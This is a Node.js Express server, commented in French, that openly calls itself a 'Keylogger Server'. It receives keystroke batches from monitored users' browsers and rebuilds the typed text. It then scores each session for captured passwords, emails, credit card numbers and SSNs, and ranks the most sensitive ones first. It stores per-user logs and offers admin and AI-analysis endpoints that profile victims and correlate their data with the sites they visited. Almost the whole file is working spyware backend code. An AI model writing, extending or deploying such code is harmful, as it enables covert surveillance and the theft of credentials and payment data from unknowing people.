const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { analyzeUserPersona, generateSessionSummary, analyzeGlobalTrends, analyzeDataByURL } = require("./ai-analysis");

const app = express();
const PORT = process.env.PORT || 4000;

// Charger les variables d'environnement
require('dotenv').config();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve admin interface

// Directories
const LOGS_DIR = path.join(__dirname, 'logs');
const DATA_DIR = path.join(__dirname, 'data');
const USERS_DB = path.join(DATA_DIR, 'users.json');
const AI_CACHE_FILE = path.join(DATA_DIR, "ai-cache.json");

// Create directories if they don't exist
[LOGS_DIR, DATA_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Initialize users database
if (!fs.existsSync(USERS_DB)) {
    fs.writeFileSync(USERS_DB, JSON.stringify({ users: {} }, null, 2));
}

// Initialize AI cache
if (!fs.existsSync(AI_CACHE_FILE)) {
  fs.writeFileSync(AI_CACHE_FILE, JSON.stringify({ personas: {}, summaries: {}, globalTrends: null }, null, 2));
}

// Database functions
function readUsersDB() {
    try {
        const data = fs.readFileSync(USERS_DB, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { users: {} };
    }
}

function writeUsersDB(data) {
    fs.writeFileSync(USERS_DB, JSON.stringify(data, null, 2));
}

function addSession(userId, sessionData) {
    const db = readUsersDB();

    if (!db.users[userId]) {
        db.users[userId] = {
            userId: userId,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            totalSessions: 0,
            totalKeystrokes: 0,
            sessions: []
        };
    }

    db.users[userId].sessions.push({
        ...sessionData,
        sessionId: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        receivedAt: new Date().toISOString()
    });

    db.users[userId].lastSeen = new Date().toISOString();
    db.users[userId].totalSessions++;
    db.users[userId].totalKeystrokes += sessionData.keystrokes.length;

    writeUsersDB(db);
    return db.users[userId];
}

// Function to format keystrokes into readable text
function formatKeystrokes(keystrokes) {
    let text = '';
    keystrokes.forEach(k => {
        if (k.key.length === 1 && !k.isSpecialKey) {
            text += k.key;
        } else if (k.key === 'Backspace' && text.length > 0) {
            text = text.slice(0, -1);
        } else if (k.key === 'Enter') {
            text += '\n';
        } else if (k.key === 'Tab') {
            text += '\t';
        } else if (k.key === ' ') {
            text += ' ';
        } else if (k.isSpecialKey) {
            text += ` [${k.key}] `;
        }
    });
    return text;
}

// Fonction pour créer un nom de fichier sûr
function sanitizeFilename(url) {
    try {
        const urlObj = new URL(url);
        const hostname = urlObj.hostname.replace(/^www\./, '');
        const pathname = urlObj.pathname.replace(/\//g, '_').replace(/[^a-zA-Z0-9_-]/g, '');
        return `${hostname}${pathname || '_index'}`.substring(0, 200);
    } catch (error) {
        return 'unknown_site';
    }
}

// Fonction pour créer un tableau formaté
function createFormattedTable(pageData) {
    const { url, title, startTime, endTime, keystrokes, userId } = pageData;

    const startDate = new Date(startTime);
    const endDate = new Date(endTime);
    const duration = Math.round((endDate - startDate) / 1000);

    let output = '';
    output += '═'.repeat(80) + '\n';
    output += '  HISTORIQUE DES TOUCHES CLIQUÉES\n';
    output += '═'.repeat(80) + '\n\n';

    output += '┌─ INFORMATIONS DE LA SESSION ─────────────────────────────────────────┐\n';
    output += `│ Utilisateur : ${userId}\n`;
    output += `│ Site Web    : ${title}\n`;
    output += `│ URL         : ${url}\n`;
    output += `│ Début       : ${startDate.toLocaleString('fr-FR')}\n`;
    output += `│ Fin         : ${endDate.toLocaleString('fr-FR')}\n`;
    output += `│ Durée       : ${duration} secondes\n`;
    output += `│ Touches     : ${keystrokes.length} touches enregistrées\n`;
    output += '└───────────────────────────────────────────────────────────────────────┘\n\n';

    output += '┌─ TEXTE SAISI ─────────────────────────────────────────────────────────┐\n';
    const text = formatKeystrokes(keystrokes);
    const lines = text.split('\n');
    lines.forEach(line => {
        if (line.trim()) {
            output += `│ ${line}\n`;
        }
    });
    output += '└───────────────────────────────────────────────────────────────────────┘\n\n';

    output += '┌─ DÉTAIL DES TOUCHES ──────────────────────────────────────────────────┐\n';
    output += '│ Heure      │ Touche        │ Input                  │ Modificateurs  │\n';
    output += '├────────────┼───────────────┼────────────────────────┼────────────────┤\n';

    keystrokes.forEach(k => {
        const time = new Date(k.timestamp).toLocaleTimeString('fr-FR');
        const key = k.key.padEnd(13);
        const input = (k.inputType || 'N/A').padEnd(22);
        const mods = [];
        if (k.ctrlKey) mods.push('Ctrl');
        if (k.altKey) mods.push('Alt');
        if (k.shiftKey) mods.push('Shift');
        if (k.metaKey) mods.push('Cmd');
        const modifiers = (mods.join('+') || '-').padEnd(14);

        output += `│ ${time} │ ${key} │ ${input} │ ${modifiers} │\n`;
    });

    output += '└────────────┴───────────────┴────────────────────────┴────────────────┘\n\n';

    return output;
}

// ===== ROUTES API =====

// Route principale
app.get('/', (req, res) => {
    res.json({
        message: 'Keylogger Server active',
        endpoints: {
            'POST /batch-data': 'Enregistrer une session',
            'GET /api/users': 'Liste des utilisateurs',
            'GET /api/users/:userId': 'Détails d\'un utilisateur',
            'GET /api/stats': 'Statistiques globales',
            'GET /admin': 'Interface admin'
        }
    });
});

// Receive batched data
app.post('/batch-data', async (req, res) => {
    const pageData = req.body;

    if (!pageData || !pageData.url || !pageData.keystrokes || !pageData.userId) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    try {
        // Analyser la sensibilité de la session
        const sensitivity = analyzeSessionSensitivity(pageData);
        
        // Add sensitivity score to data
        pageData.sensitivityScore = sensitivity.score;
        pageData.sensitivityLevel = sensitivity.level;
        pageData.sensitiveData = sensitivity.sensitiveData;

        // Add to users database
        const user = addSession(pageData.userId, pageData);

        // Créer le fichier TXT
        const filename = sanitizeFilename(pageData.url);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filepath = path.join(LOGS_DIR, `${pageData.userId}_${filename}_${timestamp}.txt`);

        const content = createFormattedTable(pageData);
        fs.writeFileSync(filepath, content, 'utf8');

        console.log(`\n📝 Session saved: ${path.basename(filepath)}`);
        console.log(`   User: ${pageData.userId} | ${pageData.keystrokes.length} keys on ${pageData.url}`);
        console.log(`   🔒 Sensitivity: ${sensitivity.level.toUpperCase()} (score: ${sensitivity.score})`);
        
        if (sensitivity.sensitiveData.hasPassword) {
            console.log(`   ⚠️  Password detected in: ${sensitivity.sensitiveData.passwordInputs.join(', ')}`);
        }
        if (sensitivity.sensitiveData.hasEmail) {
            console.log(`   📧 Email detected`);
        }
        if (sensitivity.sensitiveData.hasCreditCard) {
            console.log(`   💳 Credit card detected!`);
        }

        // Analyse IA en arrière-plan (non-bloquant)
        analyzeSessionInBackground(pageData).catch(err => {
            console.error('❌ Erreur analyse IA:', err.message);
        });

        res.json({
            success: true,
            message: 'Session enregistrée',
            filename: path.basename(filepath),
            sensitivity: {
                score: sensitivity.score,
                level: sensitivity.level
            },
            user: {
                userId: user.userId,
                totalSessions: user.totalSessions,
                totalKeystrokes: user.totalKeystrokes
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'enregistrement:', error);
        res.status(500).json({ error: 'Erreur lors de l\'enregistrement' });
    }
});

// Fonction d'analyse IA en arrière-plan
async function analyzeSessionInBackground(session) {
    try {
        const text = formatKeystrokes(session.keystrokes).toLowerCase();
        
        // Détecter les patterns suspects
        const suspiciousPatterns = {
            credentials: /password|login|signin|auth|token|api[_\s]?key/i,
            admin: /sudo|admin|root|chmod|chown/i,
            sensitive: /credit[_\s]?card|ssn|social[_\s]?security/i,
            commands: /rm\s+-rf|delete|drop\s+table/i
        };

        let alerts = [];
        
        for (const [type, pattern] of Object.entries(suspiciousPatterns)) {
            if (pattern.test(text)) {
                alerts.push({
                    type,
                    severity: type === 'admin' || type === 'commands' ? 'high' : 'medium',
                    pattern: pattern.toString()
                });
            }
        }

        if (alerts.length > 0) {
            console.log(`🚨 ${alerts.length} alert(s) detected in ${session.userId}'s session`);
        }
        
    } catch (error) {
        console.error('Erreur analyse session:', error);
    }
}

// Fonction pour analyser et scorer une session
function analyzeSessionSensitivity(session) {
    let score = 0;
    let sensitiveData = {
        hasPassword: false,
        hasEmail: false,
        hasCreditCard: false,
        hasSSN: false,
        hasPhoneNumber: false,
        passwordInputs: [],
        emailInputs: [],
        sensitiveInputs: []
    };

    // Parcourir les keystrokes pour détecter les types d'inputs
    session.keystrokes.forEach(k => {
        if (k.inputMetadata) {
            const meta = k.inputMetadata;
            
            // Détecter les champs de mot de passe
            if (meta.type === 'password' || 
                meta.name?.toLowerCase().includes('password') ||
                meta.name?.toLowerCase().includes('passwd') ||
                meta.id?.toLowerCase().includes('password') ||
                meta.autocomplete === 'current-password' ||
                meta.autocomplete === 'new-password') {
                sensitiveData.hasPassword = true;
                score += 50;
                
                if (!sensitiveData.passwordInputs.includes(meta.name || meta.id)) {
                    sensitiveData.passwordInputs.push(meta.name || meta.id || 'unknown');
                }
            }

            // Détecter les champs email
            if (meta.type === 'email' ||
                meta.name?.toLowerCase().includes('email') ||
                meta.name?.toLowerCase().includes('mail') ||
                meta.autocomplete === 'email') {
                sensitiveData.hasEmail = true;
                score += 20;
                
                if (!sensitiveData.emailInputs.includes(meta.name || meta.id)) {
                    sensitiveData.emailInputs.push(meta.name || meta.id || 'unknown');
                }
            }

            // Détecter carte de crédit
            if (meta.type === 'tel' && (
                meta.name?.toLowerCase().includes('card') ||
                meta.name?.toLowerCase().includes('credit') ||
                meta.autocomplete === 'cc-number' ||
                meta.autocomplete === 'cc-exp' ||
                meta.autocomplete === 'cc-cvc')) {
                sensitiveData.hasCreditCard = true;
                score += 80;
            }

            // Détecter numéro de téléphone
            if (meta.type === 'tel' ||
                meta.autocomplete === 'tel' ||
                meta.name?.toLowerCase().includes('phone') ||
                meta.name?.toLowerCase().includes('mobile')) {
                sensitiveData.hasPhoneNumber = true;
                score += 10;
            }

            // Autres champs sensibles
            if (meta.name?.toLowerCase().includes('ssn') ||
                meta.name?.toLowerCase().includes('social') ||
                meta.name?.toLowerCase().includes('secret') ||
                meta.name?.toLowerCase().includes('token') ||
                meta.name?.toLowerCase().includes('api')) {
                score += 40;
                sensitiveData.sensitiveInputs.push(meta.name);
            }
        }
    });

    // Analyser le contenu textuel
    const text = formatKeystrokes(session.keystrokes);
    
    // Pattern email
    const emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
    if (emailPattern.test(text)) {
        sensitiveData.hasEmail = true;
        score += 15;
    }

    // Pattern carte de crédit (format simple)
    const ccPattern = /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g;
    if (ccPattern.test(text)) {
        sensitiveData.hasCreditCard = true;
        score += 100;
    }

    // Pattern SSN américain
    const ssnPattern = /\b\d{3}-\d{2}-\d{4}\b/g;
    if (ssnPattern.test(text)) {
        sensitiveData.hasSSN = true;
        score += 100;
    }

    // Pattern numéro de téléphone
    const phonePattern = /\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b/g;
    if (phonePattern.test(text)) {
        sensitiveData.hasPhoneNumber = true;
        score += 10;
    }

    return {
        score,
        level: score > 100 ? 'critical' : score > 50 ? 'high' : score > 20 ? 'medium' : 'low',
        sensitiveData
    };
}

// API: Liste des utilisateurs
app.get('/api/users', (req, res) => {
    try {
        const db = readUsersDB();
        const usersList = Object.values(db.users).map(user => ({
            userId: user.userId,
            firstSeen: user.firstSeen,
            lastSeen: user.lastSeen,
            totalSessions: user.totalSessions,
            totalKeystrokes: user.totalKeystrokes,
            sessionsCount: user.sessions.length
        }));

        res.json({ users: usersList, total: usersList.length });
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture des utilisateurs' });
    }
});

// API: Détails d'un utilisateur
app.get('/api/users/:userId', (req, res) => {
    try {
        const db = readUsersDB();
        const user = db.users[req.params.userId];

        if (!user) {
            return res.status(404).json({ error: 'Utilisateur non trouvé' });
        }

        // Trier les sessions par score de sensibilité (plus sensible en premier)
        const sortedSessions = [...user.sessions].sort((a, b) => {
            const scoreA = a.sensitivityScore || 0;
            const scoreB = b.sensitivityScore || 0;
            return scoreB - scoreA;
        });

        res.json({
            ...user,
            sessions: sortedSessions,
            stats: {
                criticalSessions: sortedSessions.filter(s => s.sensitivityLevel === 'critical').length,
                highSessions: sortedSessions.filter(s => s.sensitivityLevel === 'high').length,
                mediumSessions: sortedSessions.filter(s => s.sensitivityLevel === 'medium').length,
                lowSessions: sortedSessions.filter(s => s.sensitivityLevel === 'low').length,
                passwordInputsDetected: sortedSessions.filter(s => s.sensitiveData?.hasPassword).length,
                emailInputsDetected: sortedSessions.filter(s => s.sensitiveData?.hasEmail).length,
                creditCardDetected: sortedSessions.filter(s => s.sensitiveData?.hasCreditCard).length
            }
        });
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture de l\'utilisateur' });
    }
});

// API: Statistiques globales
app.get('/api/stats', (req, res) => {
    try {
        const db = readUsersDB();
        const users = Object.values(db.users);

        const stats = {
            totalUsers: users.length,
            totalSessions: users.reduce((sum, u) => sum + u.totalSessions, 0),
            totalKeystrokes: users.reduce((sum, u) => sum + u.totalKeystrokes, 0),
            activeToday: users.filter(u => {
                const lastSeen = new Date(u.lastSeen);
                const today = new Date();
                return lastSeen.toDateString() === today.toDateString();
            }).length
        };

        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors du calcul des stats' });
    }
});

// ===== ROUTES IA =====

// Analyser un utilisateur avec l'IA
app.get('/api/ai/analyze-user/:userId', async (req, res) => {
    try {
        const db = readUsersDB();
        const user = db.users[req.params.userId];

        if (!user) {
            return res.status(404).json({ error: 'Utilisateur non trouvé' });
        }

        console.log(`🤖 AI analysis of user ${user.userId}...`);
        const analysis = await analyzeUserPersona(user);

        res.json({
            userId: user.userId,
            analysis: analysis,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Erreur analyse IA:', error);
        res.status(500).json({ error: 'Erreur lors de l\'analyse IA' });
    }
});

// Analyser une session spécifique avec l'IA
app.post('/api/ai/analyze-session', async (req, res) => {
    try {
        const { session } = req.body;

        if (!session) {
            return res.status(400).json({ error: 'Session manquante' });
        }

        console.log(`🤖 AI analysis of session on ${session.url}...`);
        const { analyzeSessionType } = require('./ai-analysis');
        const analysis = await analyzeSessionType(session);

        res.json({
            analysis: analysis,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Erreur analyse session IA:', error);
        res.status(500).json({ 
            error: 'Erreur lors de l\'analyse de la session',
            analysis: {
                type: 'other',
                category: 'Non analysé',
                description: 'Analyse non disponible',
                keywords: [],
                isPasswordEntry: false,
                containsCredentials: false,
                intention: 'Indéterminé'
            }
        });
    }
});

// Correlate data with URL to detect critical information
app.post('/api/ai/correlate-url', async (req, res) => {
    try {
        const { session } = req.body;

        if (!session) {
            return res.status(400).json({ error: 'Missing session' });
        }

        console.log(`🔍 AI URL->Data correlation for ${session.url}...`);
        const correlation = await analyzeDataByURL(session);

        res.json({
            correlation: correlation,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ URL correlation error:', error);
        res.status(500).json({ 
            error: 'Error during data correlation',
            correlation: {
                siteType: 'other',
                siteName: 'Site inconnu',
                riskLevel: 'low',
                dataType: 'navigation',
                highlightReason: 'Analyse non disponible',
                detectedData: {
                    hasCredentials: false,
                    hasPaymentInfo: false,
                    hasPersonalInfo: false,
                    hasSensitiveSearch: false
                },
                securityConcern: 'Analyse temporairement indisponible',
                recommendations: [],
                shouldHighlight: false,
                tags: ['non-analysé']
            }
        });
    }
});

// Générer un résumé de session avec l'IA
app.get('/api/ai/session-summary/:userId/:sessionId', async (req, res) => {
    try {
        const db = readUsersDB();
        const user = db.users[req.params.userId];

        if (!user) {
            return res.status(404).json({ error: 'Utilisateur non trouvé' });
        }

        const session = user.sessions.find(s => s.sessionId === req.params.sessionId);
        if (!session) {
            return res.status(404).json({ error: 'Session non trouvée' });
        }

        console.log(`🤖 Generating AI summary for session ${session.sessionId}...`);
        const summary = await generateSessionSummary(session);

        res.json({
            sessionId: session.sessionId,
            summary: summary,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Erreur résumé IA:', error);
        res.status(500).json({ error: 'Erreur lors de la génération du résumé' });
    }
});

// Analyser les tendances globales avec l'IA
app.get('/api/ai/global-trends', async (req, res) => {
    try {
        const db = readUsersDB();
        const users = Object.values(db.users);

        console.log(`🤖 Analyzing global trends...`);
        const trends = await analyzeGlobalTrends(users);

        res.json({
            trends: trends,
            totalUsers: users.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Erreur tendances IA:', error);
        res.status(500).json({ error: 'Erreur lors de l\'analyse des tendances' });
    }
});

// Détection d'alertes de sécurité
app.get('/api/ai/security-alerts', (req, res) => {
    try {
        const db = readUsersDB();
        const users = Object.values(db.users);
        const alerts = [];

        users.forEach(user => {
            user.sessions.forEach(session => {
                const text = formatKeystrokes(session.keystrokes).toLowerCase();
                const url = session.url.toLowerCase();
                const title = session.title.toLowerCase();

                // Détection de comportements suspects
                let severity = 'low';
                let alertType = 'info';
                let description = '';

                // Alerte: Tentative de connexion
                if (text.includes('password') || text.includes('login') || text.includes('signin')) {
                    severity = 'medium';
                    alertType = 'auth';
                    description = `Tentative de connexion détectée sur ${session.title}`;
                }

                // Alerte: Commandes administrateur
                if (text.includes('sudo') || text.includes('admin') || text.includes('root')) {
                    severity = 'high';
                    alertType = 'admin';
                    description = `Commandes administrateur détectées sur ${session.title}`;
                }

                // Alerte: Activité bancaire
                if (url.includes('bank') || url.includes('paypal') || url.includes('payment') || 
                    title.includes('bank') || title.includes('payment')) {
                    severity = 'medium';
                    alertType = 'financial';
                    description = `Activité financière détectée: ${session.title}`;
                }

                // Alerte: Beaucoup de touches en peu de temps (bot potentiel)
                const duration = (new Date(session.endTime) - new Date(session.startTime)) / 1000;
                if (session.keystrokes.length > 200 && duration < 60) {
                    severity = 'medium';
                    alertType = 'suspicious';
                    description = `Activité inhabituelle: ${session.keystrokes.length} touches en ${Math.round(duration)}s`;
                }

                // Alerte: Navigation nocturne (comportement suspect)
                const hour = new Date(session.startTime).getHours();
                if (hour >= 2 && hour <= 5) {
                    severity = 'low';
                    alertType = 'timing';
                    description = `Activité nocturne détectée à ${hour}h sur ${session.title}`;
                }

                if (description) {
                    alerts.push({
                        userId: user.userId,
                        sessionId: session.sessionId,
                        timestamp: session.startTime,
                        severity: severity,
                        type: alertType,
                        description: description,
                        url: session.url,
                        keystrokesCount: session.keystrokes.length
                    });
                }
            });
        });

        // Trier par sévérité et date
        const severityOrder = { high: 0, medium: 1, low: 2 };
        alerts.sort((a, b) => {
            if (severityOrder[a.severity] !== severityOrder[b.severity]) {
                return severityOrder[a.severity] - severityOrder[b.severity];
            }
            return new Date(b.timestamp) - new Date(a.timestamp);
        });

        // Calculer les statistiques d'alertes
        const stats = {
            total: alerts.length,
            high: alerts.filter(a => a.severity === 'high').length,
            medium: alerts.filter(a => a.severity === 'medium').length,
            low: alerts.filter(a => a.severity === 'low').length,
            byType: {
                auth: alerts.filter(a => a.type === 'auth').length,
                admin: alerts.filter(a => a.type === 'admin').length,
                financial: alerts.filter(a => a.type === 'financial').length,
                suspicious: alerts.filter(a => a.type === 'suspicious').length,
                timing: alerts.filter(a => a.type === 'timing').length
            }
        };

        res.json({
            alerts: alerts.slice(0, 100), // Limiter à 100 alertes
            stats: stats,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Erreur alertes sécurité:', error);
        res.status(500).json({ error: 'Erreur lors de la génération des alertes' });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════╗
║   🔐 Keylogger Server Started              ║
║                                            ║
║   📡 Port: ${PORT}                            ║
║   🌐 URL: http://localhost:${PORT}            ║
║   📊 Admin: http://localhost:${PORT}/admin    ║
║   📁 Logs: logs/                       ║
║                                            ║
║   Ready to receive data...                 ║
╚════════════════════════════════════════════╝
  `);
    console.log(`📂 Database: ${USERS_DB}\n`);
});

// Gestion de l'arrêt propre
process.on('SIGINT', () => {
    console.log('\n👋 Arrêt du serveur...');
    process.exit(0);
});
